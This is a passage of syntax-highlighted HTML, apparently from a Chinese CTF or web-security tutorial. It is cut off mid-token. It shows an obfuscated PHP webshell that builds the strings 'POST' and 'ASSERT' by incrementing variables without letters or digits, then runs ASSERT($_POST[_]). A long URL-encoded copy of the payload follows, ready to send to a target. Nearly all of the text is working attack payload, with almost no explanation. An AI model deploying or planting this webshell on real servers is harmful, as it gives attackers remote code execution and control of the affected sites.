<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// O</span>
<span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// S</span>
<span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span>
<span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// T</span>
<span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token punctuation">;</span>

<span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$$____</span><span class="token punctuation">;</span>
<span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ASSERT($_POST[_]);</span>

url编码后：
<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>b<span class="token operator">%</span><span class="token number">27</span><span class="token operator">!</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">40</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">5</span>d<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">27</span>_<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token 